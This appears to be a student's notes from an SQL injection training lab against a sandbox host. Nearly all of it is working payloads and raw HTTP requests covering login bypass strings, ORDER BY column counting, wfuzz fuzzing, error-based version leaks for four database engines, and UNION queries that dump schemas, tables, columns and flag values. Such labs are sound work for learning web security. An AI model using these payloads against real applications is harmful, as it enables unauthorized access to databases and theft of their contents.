
###### SQL Injection


```
10 or id=11 -> MySQL, Oracle, SQL Server, PostgreSQL

```
String Delimiters

Injecting single quote

```
SELECT * FROM menu WHERE name = 'Tostadas''

```
Sol:

```
admin' or '1'='1

```

Closing Out Strings and Functions
Example payload:

```
foo') or id=11-- 
```

Payload becomes:

```
SELECT * FROM menu WHERE LOWER(name) = LOWER('foo') or id=11-- ') 

SELECT * FROM menu WHERE LOWER(name) LIKE LOWER('%foo') or id=11-- %')
```
Sol:
```
foo') or 1=1 --   Oracle
foo') or 1=1# MySQL
foo') or 1=1--  SQL Server
foo') or 1=1--  Postgres SQL
```

###### Sorting

Can be used to find no of columns.

```
SELECT name, price FROM menu ORDER BY name

SELECT name, price FROM menu ORDER BY 2

```
Sol:

```
POST /discovery/api/sorting HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/sorting
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 27
Connection: close

db=mysql&sort=id'&order=asc

```
MSSQL:

```
POST /discovery/api/sorting HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/sorting
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 27
Connection: close

db=mssql&sort=id;&order=asc
```

Used ; for mssql and postgres. ' for MySQL and Oracle.



###### Boundary Testing

```
SELECT * FROM menu ORDER BY 4 desc;

SELECT * FROM menu ORDER BY 5 desc; -> grnerates error as there is only 4 cols.

```


Sol:

```
POST /discovery/api/boundaries HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/boundaries
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 23
Connection: close

db=mysql&sort=5&order=2

```

###### Fuzzing

```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u http://sql-sandbox/api/intro

```
Sol:

postgres and mssql

```
POST /discovery/api/fuzzing HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/fuzzing
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 38
Connection: close

db=postgres&name=OR&sort=id&order=asc)

```

MySQL and oracle
```
POST /discovery/api/fuzzing HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/discovery/fuzzing
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 41
Connection: close

db=oracle&name=admin&sort=id&order=asc'
```



##### Exploiting SQL Injection

###### Error-based Payloads
force erroneous data type conversions

SQL Server

```
cast(@@version as integer)

```
Postgres SQL

```
cast(version() as integer)
```
MySQL

```
extractvalue('',concat('>',version()))
```
In this payload, we call the extractvalue() function and pass in a blank string as the first parameter (the XML fragment). For the second parameter, we use the concat() function to concatenate the greater-than symbol (>) and version(). We can use many different values for the first value in the concat() function as long as the resulting value is not a valid XPath expression. We want to avoid values that start with a forward slash (/), a period (.), the at character (@), or a completely alphanumeric string since these values would start a valid XPath expression. We are using the greater-than symbol (>) because it is a delimiter in XML and cannot be part of a valid XML node.


Oracle

```
to_char(dbms_xmlgen.getxml('select "'|| (select substr(banner,0,30) from v$version where rownum=1)||'" from sys.dual'))
```

Error Based Sol:

```
POST /exploit/api/error HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/exploit/error
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 60
Connection: close

inStock=cast(@@version as integer)&name=as&sort=id&order=asc

```
```
POST /exploit/api/error HTTP/1.1
Host: sql-sandbox
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sql-sandbox/exploit/error
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://sql-sandbox
Content-Length: 57
Connection: close

inStock=1&name=mop%27+or+%271%27%3D%271&sort=id&order=asc
```


```
1+or+1=1

inStock=cast(@@version+as+varchar)&name=&sort=id&order=asc

cast(@@version+as+varchar)


SELECT string_agg(name, ', ') FROM sys.databases;

cast((SELECT+string_agg(name,+',')+FROM+sys.databases;)+as+varchar)

cast((SELECT+string_agg(name,+',')+FROM+sys.databases+where+name+like+'e%';)+as+varchar)

cast((SELECT+string_agg(name,+',')+FROM+sys.databases+where+name+not+in+('master');)+as+varchar)

select string_agg(table_name, ',') from app.information_schema.tables

cast((select+string_agg(table_name,+',')+from+app.information_schema.tables;)+as+varchar)

cast((select+string_agg(table_name,+',')+from+exercise.information_schema.tables;)+as+varchar)

select string_agg(column_name, ',') from app.information_schema.columns where table_name='secretTable'

cast((select+string_agg(column_name,+',')+from+app.information_schema.columns+where+table_name='secretTable';)+as+varchar)

cast((select+string_agg(column_name,+',')+from+exercise.information_schema.columns+where+table_name='secrets';)+as+varchar)

select flag from app.dbo.secretTable;

cast((select+flag+from+app.dbo.secretTable;)+as+varchar)

cast((select+flag+from+exercise.dbo.secrets;)+as+varchar)


cast((select+flag+from+app.dbo.flags;)+as+varchar)

cast((select+flag+from+exercise.dbo.flags;)+as+varchar)

```



1
(Microsoft, 2021), https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver15 ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Null_(SQL) ↩︎

3
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html ↩︎

4
(Oracle, 2021), https://dev.mysql.com/doc/refman/8.0/en/xml-functions.html#function_extractvalue ↩︎

5
(Wikipedia, 2021), https://en.wikipedia.org/wiki/XPath ↩︎

6
(Oracle, 2016), https://docs.oracle.com/database/121/ARPLS/d_xmlgen.htm#ARPLS69856 ↩︎

7
(Swissky, et al, 2021) https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md ↩︎

8
(NetSPI, 2019), https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql ↩︎


###### UNION-based Payloads

```
SELECT id, name, description, price FROM menu UNION ALL SELECT id, username, password, 1 FROM users;

```

Input:

```
0 UNION ALL SELECT id, username, password, 0 from users
```


Query:
```
SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users
```

```

')  or ('1'='1

z')) union select  version(),2,3,4--   

```

Payload:

```

name=z%27%29%29+union+select+VERSION()%2C2%2C3%2C4--+&sort=id&order=asc

```
Union based sol:

```
')  or ('1'='1
'))--+ 

select group_concat(distinct(table_schema) separator ', ') from information_schema.tables;


select * from tablename where lower(name) like lower(concat('%',user_input,'%')); 




z'))+union+select+version(),2,3,4--+

z'))+union+select+concat('a','b'),2,3,4--+

z'))+union+select+(select+group_concat(distinct(table_schema)+separator+',+')+from+information_schema.tables;),2,3,4--+

z'))+union+select+(select+group_concat(distinct(table_name)+separator+',+')+from+information_schema.tables+where+table_schema='app';),2,3,4--+

z'))+union+select+(select+group_concat(distinct(table_name)+separator+',+')+from+information_schema.tables+where+table_schema='exercise';),2,3,4--+

z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='app'+and+table_name='hiddenTable';),2,3,4--+

z'))+union+select+(select+group_concat(distinct(column_name)+separator+',+')+from+information_schema.columns+where+table_schema='exercise'+and+table_name='secrets';),2,3,4--+

```

